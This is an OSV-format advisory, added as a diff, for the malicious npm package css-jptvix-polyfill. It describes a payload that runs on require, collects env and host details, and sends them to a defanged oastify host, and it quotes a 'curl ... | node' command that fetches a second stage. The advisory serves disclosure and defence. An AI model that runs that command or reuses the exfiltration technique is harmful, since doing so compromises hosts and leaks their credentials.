@@ -1,0 +1,67 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12604",
+  "modified": "2026-10-06T08:09:03Z",
+  "published": "2026-10-06T08:08:37Z",
+  "summary": "Malicious code in css-jptvix-polyfill (npm)",
+  "details": "The package ships a hidden payload in package/thunderboltRegistry.js that executes as soon as the module is required. It first removes its own entry from require.cache to avoid later inspection, then shells out to collect host reconnaissance — `id`, `id -un`/`whoami`, the full `env` output, and `ifconfig`/`ip addr` — and sends each result as an HTTP GET to hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/ with the victim hostname appended as a `site=` parameter. It then runs `curl -L hxxps://appsecc[.]com/js | node`, fetching and executing a second-stage script from appsecc[.]com, and finally beacons the Node version, platform and PID to the same endpoint with `beacon=rce-poc`. The rest of the file is a Proxy-based stub factory that exports thunderboltRegistry/siteAssetsRegistry/corvidRegistry and similar names, cloning the surface of Wix's Thunderbolt registry shim (registry-manifest.min.json references static[.]parastorage[.]com/unpkg/...) so the module appears to be a legitimate registry polyfill; index.js is an empty module and package.json declares no install hooks, so the payload fires on require of the bundled file. The package name is a combosquat of the real css-polyfill name with an inserted segment, and the declared \"CSS polyfill utility\" purpose is cover for the exfiltration and remote code execution.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "css-jptvix-polyfill",
+        "purl": "pkg:npm/css-jptvix-polyfill"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/css-jptvix-polyfill/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12604"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-06T08:08:37Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "appsecc[.]com",
+          "orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com",
+          "static[.]parastorage[.]com"
+        ],
+        "sha256": [
+          "a123d1c8306596b90cee0521d1a014b5f973c281362d0515990421fddc7b1cd7"
+        ],
+        "url_observed": [
+          "hxxps://appsecc[.]com/js",
+          "hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/"
+        ]
+      }
+    }
+  }
+}
